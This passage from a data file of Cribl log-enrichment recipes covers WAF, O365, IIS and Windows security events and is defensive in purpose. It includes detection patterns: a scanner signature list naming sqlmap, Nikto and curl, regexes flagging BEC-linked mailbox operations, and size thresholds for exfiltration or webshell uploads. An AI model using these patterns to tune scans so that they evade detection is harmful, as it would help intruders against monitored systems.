          lookupSample: 'hostname,app_name,owner,team,criticality\nwww.example.com,public-website,jdoe,web-team,Tier-1\napi.example.com,customer-api,bsmith,platform-team,Tier-1\nstaging.example.com,staging-site,jdoe,web-team,Tier-3\nadmin.example.com,admin-portal,security-ops,security-team,Tier-2',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: application_registry.csv\n// Input: host → hostname (exact match)\n// Output: app_name, owner → app_owner, team → app_team, criticality → app_criticality\n//\n// Result: { host: "api.example.com", app_name: "customer-api", app_owner: "bsmith", app_team: "platform-team", app_criticality: "Tier-1" }',
          notes: 'Pull from service registry (Consul, ServiceNow, internal CMDB). Include all hostnames served through Akamai CDN. Update when new properties are onboarded.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Attack Campaign Correlation',
        description: 'Group WAF events by client_ip, attack patterns, and timing to identify coordinated attack campaigns targeting multiple hosts or endpoints.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['campaign_id', 'campaign_duration_min', 'campaign_target_count', 'campaign_technique_mix'],
        securityValue: 'Enables campaign-level visibility — see the full scope of a coordinated attack rather than individual rule triggers. Identifies multi-vector attacks (SQLi + XSS + credential stuffing).',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search campaign identification:\n// dataset="akamai_waf" rule_action in ("deny", "alert") earliest=-4h\n// | summarize AttackCount=count(), Targets=dcount(host), Techniques=makeset(owasp_category),\n//     Duration=datetime_diff(\'minute\', max(timestamp), min(timestamp)), Paths=dcount(path)\n//   by client_ip\n// | where AttackCount > 10 and Targets > 1\n// | extend campaign_type = iif(Targets > 3, "distributed-campaign", "focused-attack")\n// | order by AttackCount desc',
          notes: 'Campaign identification uses IP + timing + target diversity as clustering signals. A single IP hitting 5+ hosts with mixed techniques strongly indicates automated campaign.'
        }
      },
      {
        name: 'Historical IP Activity',
        description: 'Join current attacker IP against historical WAF events to determine if this is a returning attacker and reconstruct their full activity timeline.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['ip_first_seen', 'ip_total_attacks', 'ip_target_history', 'ip_technique_history'],
        securityValue: 'Provides historical context during investigation — is this a new attacker or a persistent threat? What have they targeted before? Enables pattern recognition across long time windows.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search historical lookup:\n// dataset="akamai_waf" client_ip="$ATTACKER_IP" earliest=-90d\n// | summarize FirstSeen=min(timestamp), LastSeen=max(timestamp), TotalAttacks=count(),\n//     TargetsHit=dcount(host), Techniques=makeset(owasp_category), Actions=makeset(rule_action)\n//   by client_ip\n// | extend persistence_days = datetime_diff(\'day\', LastSeen, FirstSeen)\n// | extend threat_level = iif(persistence_days > 7 and TotalAttacks > 100, "persistent-threat", "opportunistic")',
          notes: 'Requires 90-day retention in Cribl Lake for meaningful historical analysis. Persistent attackers (same IP, multiple days) warrant blocklist addition and threat intel sharing.'
        }
      }
    ]
  },
  'o365-activity': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to client_ip for identifying anomalous access locations and impossible travel scenarios.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Enables impossible travel detection, identifies access from unexpected countries, supports geographic access policy enforcement for sensitive O365 operations.',
        observabilityValue: 'Enables geographic usage distribution dashboards, identifies which regions drive the most O365 activity.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'client_ip',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'client_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: client_ip\n// Output: client_country, client_city, client_asn, client_org\n// Filter: Only apply when client_ip is not empty and not RFC1918\n//\n// Result: { client_ip: "203.0.113.50", client_country: "CN", client_city: "Beijing", client_asn: "AS4134", client_org: "ChinaNet" }',
          notes: 'O365 audit logs sometimes have empty client_ip for background/system operations. Skip enrichment for these. Handle IPv6 addresses from mobile clients.'
        }
      },
      {
        name: 'User Risk Score Lookup',
        description: 'Enrich user_id with current risk score from identity platform (Azure AD Identity Protection, Okta) to provide user-level context.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'user_risk_level', 'user_risk_factors'],
        securityValue: 'Correlates O365 activity with identity risk — "high-risk user creating inbox forwarding rules" combines two signals for stronger detection confidence.',
        observabilityValue: 'Supports "activity from risky users" metrics for security posture reporting.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_scores.csv',
            inputField: 'user_id → username',
            outputFields: ['user_risk_score', 'user_risk_level', 'user_risk_factors'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'username,risk_score,risk_level,risk_factors\njsmith@company.com,25,low,none\nadmin@company.com,75,high,privileged;anomalous-location\nguest_user@external.com,60,medium,external;new-account',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_scores.csv\n// Input: user_id → username (case-insensitive)\n// Output: risk_score → user_risk_score, risk_level → user_risk_level, risk_factors → user_risk_factors\n//\n// Result: { user_id: "admin@company.com", user_risk_score: 75, user_risk_level: "high", user_risk_factors: "privileged;anomalous-location" }',
          notes: 'Pull risk scores from Azure AD Identity Protection or UEBA platform every 15 minutes. Scores change frequently as signals update.'
        }
      },
      {
        name: 'Sensitive Operation Classification Eval',
        description: 'Classify O365 operations into sensitivity tiers based on operation name patterns and workload context.',
        criblFunction: 'Eval',
        addedFields: ['operation_sensitivity', 'requires_approval', 'compliance_relevant'],
        securityValue: 'Pre-classifies operations at pipeline level — enables priority routing where high-sensitivity operations always go to SIEM regardless of volume reduction strategies.',
        observabilityValue: 'Supports "sensitive operation rate" metrics for compliance dashboards.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Operation sensitivity classification',
            outputField: 'operation_sensitivity'
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// operation_sensitivity = /New-InboxRule|Set-Mailbox|Add.*Role|Remove.*Role|Grant|eDiscovery|Set-AdminAuditLogConfig/.test(operation) ? \'critical\'\n//   : /AnonymousLink|SharingSet|AddedToGroup|MemberAdded/.test(operation) ? \'high\'\n//   : /FileDeleted|FolderDeleted|MailItemsDeleted/.test(operation) ? \'medium\' : \'low\'\n// requires_approval = operation_sensitivity in (\'critical\', \'high\') ? \'true\' : \'false\'\n// compliance_relevant = /eDiscovery|DLP|Sensitivity|Retention|Hold/.test(operation) ? \'true\' : \'false\'\n//\n// Result: { operation: "New-InboxRule", operation_sensitivity: "critical", requires_approval: "true", compliance_relevant: "false" }',
          notes: 'Tune sensitivity classification based on your compliance requirements. eDiscovery operations are always critical in regulated environments. Inbox rules are BEC indicators.'
        }
      },
      {
        name: 'Department/Manager Lookup',
        description: 'Enrich user_id with organizational context: department, manager, job title, and employment type from HR directory.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_manager', 'user_title', 'user_employment_type'],
        securityValue: 'Enables context-aware detection: "Finance user sharing files externally" vs "Marketing user sharing files externally" have different risk profiles. Identifies organizational anomalies.',
        observabilityValue: 'Enables department-level O365 usage analytics, adoption tracking by team, and storage utilization by business unit.',
        personas: ['SOC', 'Compliance', 'Identity Team', 'IT Operations'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'hr_directory.csv',
            inputField: 'user_id → email',
            outputFields: ['user_department', 'user_manager', 'user_title', 'user_employment_type'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'email,department,manager,title,employment_type\njsmith@company.com,Engineering,Jane Doe,Senior Developer,full-time\ncfo@company.com,Finance,CEO,Chief Financial Officer,full-time\ncontractor@company.com,Consulting,,Consultant,contractor\nguest@external.com,External,,Guest,guest',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: hr_directory.csv\n// Input: user_id → email (case-insensitive)\n// Output: department → user_department, manager → user_manager, title → user_title, employment_type → user_employment_type\n//\n// Result: { user_id: "cfo@company.com", user_department: "Finance", user_title: "Chief Financial Officer", user_employment_type: "full-time" }',
          notes: 'Pull from HR system (Workday, BambooHR) or Azure AD directory. Key insight: contractors and guests sharing data externally warrant higher scrutiny than full-time employees.'
        }
      },
      {
        name: 'Workload Criticality Eval',
        description: 'Assign criticality scores to O365 workloads and record types based on data sensitivity and business impact.',
        criblFunction: 'Eval',
        addedFields: ['workload_criticality', 'data_sensitivity_tier', 'routing_priority'],
        securityValue: 'Enables priority-based routing — events from high-criticality workloads (Exchange admin, Azure AD) always route to SIEM regardless of volume optimization.',
        observabilityValue: 'Supports workload-tier health monitoring — ensure high-criticality services get priority monitoring attention.',
        personas: ['Security Engineering', 'SOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Workload criticality mapping',
            outputField: 'workload_criticality'
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// workload_criticality = workload == \'AzureActiveDirectory\' ? \'critical\'\n//   : workload == \'Exchange\' && user_type == \'Admin\' ? \'critical\'\n//   : workload == \'Exchange\' ? \'high\'\n//   : workload == \'SharePoint\' && operation.includes(\'Sharing\') ? \'high\'\n//   : workload == \'SharePoint\' ? \'medium\' : \'low\'\n// data_sensitivity_tier = sensitivity_label != \'\' ? \'classified\' : workload_criticality\n// routing_priority = workload_criticality in (\'critical\', \'high\') ? \'always-siem\' : \'conditional\'\n//\n// Result: { workload: "AzureActiveDirectory", operation: "Add member to role", workload_criticality: "critical", routing_priority: "always-siem" }',
          notes: 'Azure AD admin operations are always critical regardless of volume. SharePoint sharing events are high when external. Tune based on your compliance scope.'
        }
      },
      {
        name: 'DLP Severity Mapping Lookup',
        description: 'Map DLP policy names to severity levels, data categories, and compliance frameworks for enriched classification.',
        criblFunction: 'Lookup',
        addedFields: ['dlp_severity', 'dlp_data_category', 'dlp_compliance_framework'],
        securityValue: 'Converts DLP policy names into actionable severity for prioritization. "PCI-CardNumbers-Block" immediately communicates higher urgency than a generic policy name.',
        observabilityValue: 'Supports DLP effectiveness dashboards: policy hit rates by category and severity for compliance reporting.',
        personas: ['SOC', 'Compliance', 'Data Protection', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'dlp_policy_classification.csv',
            inputField: 'dlp_policy_name → policy_name',
            outputFields: ['dlp_severity', 'dlp_data_category', 'dlp_compliance_framework'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'policy_name,severity,data_category,compliance_framework\nPCI-CardNumbers-Block,critical,payment-card,PCI-DSS\nHIPAA-PHI-Alert,high,health-information,HIPAA\nSSN-Detection,high,personal-identifiers,GDPR;CCPA\nInternal-Only-Alert,medium,internal-confidential,Corporate-Policy',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: dlp_policy_classification.csv\n// Input: dlp_policy_name → policy_name (exact match)\n// Output: severity → dlp_severity, data_category → dlp_data_category, compliance_framework → dlp_compliance_framework\n// Filter: Only apply when dlp_policy_name is not empty\n//\n// Result: { dlp_policy_name: "PCI-CardNumbers-Block", dlp_severity: "critical", dlp_data_category: "payment-card", dlp_compliance_framework: "PCI-DSS" }',
          notes: 'Maintain alignment with your DLP policy definitions in Microsoft Purview. Update when new policies are created or severity classifications change.'
        }
      }
    ],
    searchTime: [
      {
        name: 'User Activity Timeline',
        description: 'Reconstruct complete user activity across all O365 workloads within a time window for investigation or compliance audit.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['activity_summary', 'workloads_accessed', 'total_operations', 'sensitive_operation_count'],
        securityValue: 'Enables complete user investigation — see all actions across Exchange, SharePoint, Teams, and Azure AD in a single timeline. Critical for BEC and insider threat investigation.',
        personas: ['Incident Response', 'Compliance', 'SOC', 'Legal'],
        implementation: {
          example: '// Cribl Search user timeline:\n// dataset="o365_audit" user_id="$USER" earliest=-7d\n// | order by creation_time asc\n// | summarize OperationCount=count(), Workloads=makeset(workload), SensitiveOps=countif(operation_sensitivity in ("critical", "high")),\n//     ExternalShares=countif(external_access == "true"), Files=dcount(source_file_name)\n//   by user_id, bin(creation_time, 1h)\n// | extend risk_indicator = iif(SensitiveOps > 5 or ExternalShares > 3, "elevated", "normal")\n// | order by creation_time asc',
          notes: 'Full user timeline is the primary investigation tool for BEC (Business Email Compromise) and insider threats. Look for: inbox rule creation → external sharing → mass download pattern.'
        }
      },
      {
        name: 'Sharing History Query',
        description: 'Analyze sharing patterns for a specific user or file to identify data exposure scope and sharing evolution over time.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['sharing_scope', 'total_shares', 'external_recipients', 'sharing_trend'],
        securityValue: 'Maps the full scope of data exposure from sharing events. Answers "what was shared, with whom, and when?" for data breach investigations and DLP incident response.',
        personas: ['Incident Response', 'Compliance', 'Data Protection', 'Legal'],
        implementation: {
          example: '// Cribl Search sharing analysis:\n// dataset="o365_audit" operation in ("SharingSet", "AnonymousLinkCreated", "AddedToSecureLink", "SharingInvitationCreated") earliest=-30d\n// | where user_id == "$USER" or object_id contains "$FILE_PATH"\n// | summarize ShareCount=count(), ExternalRecipients=makeset(target_user_or_group),\n//     SharingTypes=makeset(sharing_type), Sites=makeset(site_url)\n//   by user_id, source_file_name, object_id\n// | extend exposure_level = iif(SharingTypes has "Anonymous", "public", iif(SharingTypes has "Guest", "external", "internal"))\n// | order by ShareCount desc',
          notes: 'Critical for data breach scope assessment. Anonymous links represent the highest exposure. Track sharing_type evolution: internal → guest → anonymous indicates escalating risk.'
        }
      }
    ]
  },
  'iis-access': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to client_ip or x_forwarded_for (true client IP behind load balancers) for traffic origin analysis.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Identifies attack traffic origin, enables geographic blocking recommendations, supports impossible travel detection for authenticated web applications hosted on IIS.',
        observabilityValue: 'Enables geographic traffic distribution dashboards, identifies which regions drive the most load, supports CDN and edge placement decisions.',
        personas: ['SOC', 'Security Engineering', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'client_ip (or x_forwarded_for if behind load balancer)',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'client_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Pre-Eval: true_client_ip = x_forwarded_for ? x_forwarded_for.split(\',\')[0].trim() : client_ip\n// GeoIP Input: true_client_ip\n// Output: client_country, client_city, client_asn, client_org\n//\n// BEFORE: { client_ip: "10.0.0.5", x_forwarded_for: "198.51.100.42" }\n// AFTER:  { client_ip: "10.0.0.5", x_forwarded_for: "198.51.100.42", client_country: "US", client_city: "Chicago", client_asn: "AS15169", client_org: "Google LLC" }',
          notes: 'When IIS sits behind ARR or an F5, use x_forwarded_for. When IIS is the internet edge, use client_ip (c-ip in IIS logs). Handle X-Forwarded-For with multiple hops by taking the first entry.'
        }
      },
      {
        name: 'Application Pool Lookup',
        description: 'Map site_name (s-sitename) to application team ownership, application tier, owner, and environment using a site-to-team lookup CSV.',
        criblFunction: 'Lookup',
        addedFields: ['app_team', 'app_tier', 'app_owner', 'environment'],
        securityValue: 'Enables team-aware security alerting — attacks against payment applications route to commerce security team, internal tool attacks route to IT security. Prioritizes response by application criticality.',
        observabilityValue: 'Enables per-team and per-environment traffic dashboards, error rate attribution to owning teams, and capacity planning by application tier.',
        personas: ['SOC', 'SRE', 'Platform Engineering', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'iis_site_mapping.csv',
            inputField: 's_sitename → site_name',
            outputFields: ['app_team', 'app_tier', 'app_owner', 'environment'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'site_name,app_team,app_tier,app_owner,environment\nDefault Web Site,platform-team,Tier-2,jdoe,production\nPaymentPortal,commerce-team,Tier-1,bsmith,production\nInternalAPI,api-team,Tier-2,kwilson,production\nDevTestSite,dev-team,Tier-3,mchen,development',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: iis_site_mapping.csv\n// Input: s_sitename → site_name (exact match)\n// Output: app_team, app_tier, app_owner, environment\n//\n// BEFORE: { s_sitename: "PaymentPortal", cs_uri_stem: "/api/checkout" }\n// AFTER:  { s_sitename: "PaymentPortal", app_team: "commerce-team", app_tier: "Tier-1", app_owner: "bsmith", environment: "production" }',
          notes: 'Generate from IIS Manager site list or PowerShell: Get-IISSite | Select Name. Map each site to the owning team from your service catalog. Update when new sites are deployed.'
        }
      },
      {
        name: 'Status Code Classification',
        description: 'Classify IIS status/substatus code combinations (e.g., 401.3, 500.19, 403.14) into meaningful categories with error class tagging.',
        criblFunction: 'Eval',
        addedFields: ['status_category', 'is_error', 'error_class'],
        securityValue: 'Immediately distinguishes security-relevant status codes (401.x auth failures, 403.x access denied) from operational errors (500.x server errors). Enables security-focused alerting on auth failures without noise from server errors.',
        observabilityValue: 'Enables error class dashboards showing auth errors vs server errors vs client errors. Supports rapid triage by error category rather than individual status codes.',
        personas: ['SOC', 'SRE', 'Application Team', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Status/substatus classification logic',
            outputFields: ['status_category', 'is_error', 'error_class']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// status_category = sc_status < 300 ? \'success\'\n//   : sc_status < 400 ? \'redirect\'\n//   : sc_status == 401 ? \'auth-failure\'\n//   : sc_status == 403 ? \'forbidden\'\n//   : sc_status == 404 ? \'not-found\'\n//   : sc_status < 500 ? \'client-error\'\n//   : sc_status == 503 ? \'service-unavailable\' : \'server-error\'\n//\n// is_error = sc_status >= 400 ? \'true\' : \'false\'\n// error_class = sc_status == 401 && sc_substatus == 3 ? \'acl-denied\'\n//   : sc_status == 500 && sc_substatus == 19 ? \'config-error\'\n//   : sc_status == 403 && sc_substatus == 14 ? \'directory-listing-denied\'\n//   : sc_status >= 500 ? \'server-fault\'\n//   : sc_status >= 400 ? \'client-fault\' : \'none\'\n//\n// BEFORE: { sc_status: 401, sc_substatus: 3 }\n// AFTER:  { sc_status: 401, sc_substatus: 3, status_category: "auth-failure", is_error: "true", error_class: "acl-denied" }',
          notes: 'IIS substatus codes provide critical context (401.1 = logon failed, 401.3 = ACL denied, 401.5 = ISAPI filter rejected). Include substatus in classification for precise error diagnosis.'
        }
      },
      {
        name: 'Bot/Scanner Detection Lookup',
        description: 'Match user agent patterns against a known bot and vulnerability scanner database to tag automated traffic.',
        criblFunction: 'Lookup',
        addedFields: ['is_bot', 'bot_name', 'bot_category'],
        securityValue: 'Immediately identifies vulnerability scanners (Nessus, Qualys, Nikto, sqlmap) and malicious bots at the pipeline level. Enables scanner-aware detection rules without downstream regex matching.',
        observabilityValue: 'Enables traffic composition analysis — what percentage is human vs bot? Identifies bots consuming disproportionate server resources.',
        personas: ['SOC', 'Security Engineering', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'bot_signatures.csv',
            inputField: 'cs_user_agent → ua_pattern (regex match)',
            outputFields: ['is_bot', 'bot_name', 'bot_category'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'ua_pattern,is_bot,bot_name,bot_category\n.*Googlebot.*,true,Googlebot,search-engine\n.*sqlmap.*,true,sqlmap,vulnerability-scanner\n.*Nikto.*,true,Nikto,vulnerability-scanner\n.*curl/.*,true,curl,http-client',
          example: '// Cribl Stream → Processing → Lookup Function (regex match mode)\n// Lookup File: bot_signatures.csv\n// Input: cs_user_agent → ua_pattern (regex match)\n// Output: is_bot, bot_name, bot_category\n//\n// BEFORE: { cs_user_agent: "Mozilla/5.0 (compatible; Nikto/2.1.6)" }\n// AFTER:  { cs_user_agent: "Mozilla/5.0 (compatible; Nikto/2.1.6)", is_bot: "true", bot_name: "Nikto", bot_category: "vulnerability-scanner" }',
          notes: 'Maintain a curated list of bot signatures. Include both legitimate bots (search engines, monitoring) and malicious ones (scanners, scrapers). Update when new scanning tools emerge.'
        }
      },
      {
        name: 'Request Size Anomaly Detection',
        description: 'Flag unusually large requests (cs_bytes) or responses (sc_bytes) that exceed expected thresholds per URI pattern, indicating potential data exfiltration or upload abuse.',
        criblFunction: 'Eval',
        addedFields: ['size_anomaly', 'size_percentile'],
        securityValue: 'Detects large data uploads (potential webshell deployment or exfiltration via PUT/POST) and unusually large responses (potential SQL injection data extraction). Pipeline-level flagging enables immediate alerting.',
        observabilityValue: 'Identifies endpoints with unexpectedly large payloads, supports bandwidth optimization and payload size policy enforcement.',
        personas: ['SOC', 'Security Engineering', 'SRE', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Size anomaly classification based on method and thresholds',
            outputFields: ['size_anomaly', 'size_percentile']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// size_anomaly = (cs_method == \'POST\' && cs_bytes > 10485760) ? \'large-upload\'\n//   : (cs_method == \'GET\' && sc_bytes > 52428800) ? \'large-response\'\n//   : (cs_method == \'PUT\' && cs_bytes > 5242880) ? \'suspicious-put\'\n//   : \'normal\'\n//\n// size_percentile = sc_bytes > 104857600 ? \'p99\'\n//   : sc_bytes > 52428800 ? \'p95\'\n//   : sc_bytes > 10485760 ? \'p90\' : \'normal\'\n//\n// BEFORE: { cs_method: "POST", cs_bytes: 15728640, cs_uri_stem: "/upload/file" }\n// AFTER:  { cs_method: "POST", cs_bytes: 15728640, size_anomaly: "large-upload", size_percentile: "p95" }',
          notes: 'Tune thresholds per application — file upload endpoints legitimately handle large payloads. Focus detection on non-upload URIs receiving large POSTs (potential webshell or exploit payload).'
        }
      }
    ],
    searchTime: [
      {
        name: 'Performance Baseline Query',
        description: 'Compare current request latency (time-taken) against pre-computed 7-day baselines per URI stem to identify degradation.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_time_taken_7d', 'p95_time_taken_7d'],
        securityValue: 'Latency anomalies can indicate exploitation (time-based SQL injection, resource exhaustion). Statistical comparison distinguishes real attacks from normal traffic variation.',
        observabilityValue: 'Enables "is this slow right now or always slow?" analysis without manual threshold configuration. Supports automated anomaly detection and SLO compliance checking.',
        personas: ['SRE', 'Application Team', 'NOC', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search baseline comparison:\n// dataset="iis_access" s_sitename=="PaymentPortal" earliest=-1h\n// | summarize current_avg=avg(time_taken), current_p95=percentile(time_taken, 95) by cs_uri_stem\n// | lookup iis_perf_baselines.csv on cs_uri_stem=uri_stem output avg_time_taken_7d, p95_time_taken_7d\n// | extend latency_ratio = round(current_p95 / p95_time_taken_7d, 2)\n// | where latency_ratio > 2.0\n// | order by latency_ratio desc',
          notes: 'Requires pre-computed baseline dataset (daily aggregation of time_taken by URI stem over 7 days). Latency ratio > 2.0 means current performance is 2x worse than historical — investigate.'
        }
      },
      {
        name: 'Error Pattern Query',
        description: 'Correlate IIS HTTP errors with Win32 error codes to identify patterns indicating infrastructure issues vs application bugs.',
        criblFunction: 'Search-time lookup',
        addedFields: ['error_frequency_trend', 'related_win32_errors'],
        securityValue: 'Win32 error codes reveal the underlying OS-level failure behind HTTP errors. Error 64 (network name no longer available) during authentication failures suggests active connection manipulation.',
        observabilityValue: 'Correlates HTTP-level errors with OS-level causes — transforms vague 500 errors into actionable infrastructure diagnoses (disk full, connection reset, timeout).',
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Application Team'],
        implementation: {
          example: '// Cribl Search error pattern analysis:\n// dataset="iis_access" sc_status >= 500 earliest=-4h\n// | summarize ErrorCount=count(), UniqueClients=dcount(client_ip) by sc_status, sc_substatus, sc_win32_status, cs_uri_stem\n// | lookup win32_error_codes.csv on sc_win32_status=error_code output error_description as related_win32_errors\n// | summarize total_errors=sum(ErrorCount) by cs_uri_stem, related_win32_errors\n// | join kind=left (\n//     dataset="iis_access" sc_status >= 500 earliest=-7d latest=-4h\n//     | summarize baseline_errors=count() by cs_uri_stem\n//   ) on cs_uri_stem\n// | extend error_frequency_trend = iif(total_errors > baseline_errors * 2, \'increasing\', \'stable\')\n// | order by total_errors desc',
          notes: 'Key Win32 codes: 0=success, 64=network name deleted, 121=timeout, 1236=connection aborted. Correlating HTTP status with Win32 code reveals root cause (e.g., 500 + Win32 121 = backend timeout).'
        }
      }
    ]
  },
  'windows-security': {
    streamTime: [
      {
        name: 'Account Type Classification Lookup',
        description: 'Classify usernames into account types (privileged, service, standard, computer) with tier designation based on Active Directory group membership and naming conventions.',
        criblFunction: 'Lookup',
        addedFields: ['account_type', 'is_privileged', 'is_service_account', 'account_tier'],
        securityValue: 'Enables priority-based alerting — attacks against privileged accounts are critical, against standard users are high, against service accounts depend on context. Reduces SOC alert fatigue by enabling context-appropriate severity.',
        observabilityValue: 'Enables authentication breakdown by account type, identifies service account sprawl, tracks privileged account usage patterns for access reviews.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'account_classification.csv',
            inputField: 'target_username → username',
            outputFields: ['account_type', 'is_privileged', 'is_service_account', 'account_tier'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'username,account_type,is_privileged,is_service_account,account_tier\nAdministrator,domain-admin,true,false,0\nsvc-sql-prod,privileged-service,true,true,1\njsmith,standard-user,false,false,2\nWKSTN01$,computer-account,false,false,3',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: account_classification.csv\n// Input: target_username → username (case-insensitive)\n// Output: account_type, is_privileged, is_service_account, account_tier\n//\n// BEFORE: { target_username: "svc-sql-prod", event_id: 4624 }\n// AFTER:  { target_username: "svc-sql-prod", account_type: "privileged-service", is_privileged: "true", is_service_account: "true", account_tier: "1" }',
          notes: 'Generate from: Get-ADUser -Filter * -Properties MemberOf | classify based on group membership. Domain Admins = tier-0, server admins = tier-1, standard users = tier-2, computer accounts = tier-3.'
        }
      },
      {
        name: 'Logon Type Enrichment',
        description: 'Map numeric logon type values (2, 3, 7, 10, etc.) to human-readable names and associated risk levels for Windows Security Event 4624/4625.',
        criblFunction: 'Eval',
        addedFields: ['logon_type_name', 'logon_risk_level'],
        securityValue: 'Analysts immediately understand logon context without memorizing numeric types. Type 10 (RemoteInteractive/RDP) from unexpected sources is high-risk; Type 3 (Network) is routine. Enables logon-type-aware detection rules.',
        observabilityValue: 'Enables authentication method dashboards showing RDP vs interactive vs network logon distribution. Identifies shifts in access patterns (increased RDP during remote work).',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Logon type name and risk mapping',
            outputFields: ['logon_type_name', 'logon_risk_level']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// logon_type_name = logon_type == 2 ? \'Interactive\'\n//   : logon_type == 3 ? \'Network\'\n//   : logon_type == 4 ? \'Batch\'\n//   : logon_type == 5 ? \'Service\'\n//   : logon_type == 7 ? \'Unlock\'\n//   : logon_type == 8 ? \'NetworkCleartext\'\n//   : logon_type == 9 ? \'NewCredentials\'\n//   : logon_type == 10 ? \'RemoteInteractive\'\n//   : logon_type == 11 ? \'CachedInteractive\' : \'Unknown\'\n//\n// logon_risk_level = logon_type == 10 ? \'high\'\n//   : logon_type == 8 ? \'high\'\n//   : logon_type == 2 ? \'medium\'\n//   : logon_type == 9 ? \'medium\'\n//   : logon_type == 3 ? \'low\' : \'low\'\n//\n// BEFORE: { logon_type: 10, target_username: "admin-bob" }\n// AFTER:  { logon_type: 10, logon_type_name: "RemoteInteractive", logon_risk_level: "high" }',
          notes: 'Type 10 (RDP) and Type 8 (NetworkCleartext) are highest risk — RDP enables full interactive session, cleartext passes credentials in plain text. Type 3 (Network) is routine SMB/CIFS access.'
        }
      },
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context (country, city, ASN) to ip_address field for remote logon events, identifying login origin for external-facing systems.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'src_asn'],
        securityValue: 'Enables impossible travel detection for Windows logons, identifies authentication attempts from unexpected countries, and flags logons from known bulletproof hosting or Tor exit ASNs.',
        observabilityValue: 'Tracks remote workforce distribution, identifies regional access patterns, supports VPN capacity planning based on geographic login origins.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address (Source Network Address from 4624/4625 events)\n// Output: src_country, src_city, src_asn\n// Filter: Only apply when ip_address is not RFC1918 and not \'::1\' or \'127.0.0.1\'\n//\n// BEFORE: { ip_address: "203.0.113.50", event_id: 4624, logon_type: 10 }\n// AFTER:  { ip_address: "203.0.113.50", src_country: "RU", src_city: "Moscow", src_asn: "AS48287" }',
          notes: 'Only enrich external IPs — skip RFC1918, loopback, and link-local addresses. Most valuable for logon_type 10 (RDP) and logon_type 3 (Network) from external sources.'
        }
      },
      {
        name: 'MITRE Technique Tagging Lookup',
        description: 'Map Windows Security EventIDs to MITRE ATT&CK technique IDs and tactics, providing attack framework context at ingest time.',
        criblFunction: 'Lookup',
        addedFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic'],
        securityValue: 'Pre-tags security events with ATT&CK context before reaching SIEM. Enables technique-based correlation, coverage dashboards, and attack chain visualization without downstream mapping logic.',
        observabilityValue: 'Enables "ATT&CK technique coverage" dashboards showing which techniques are observed in the environment.',
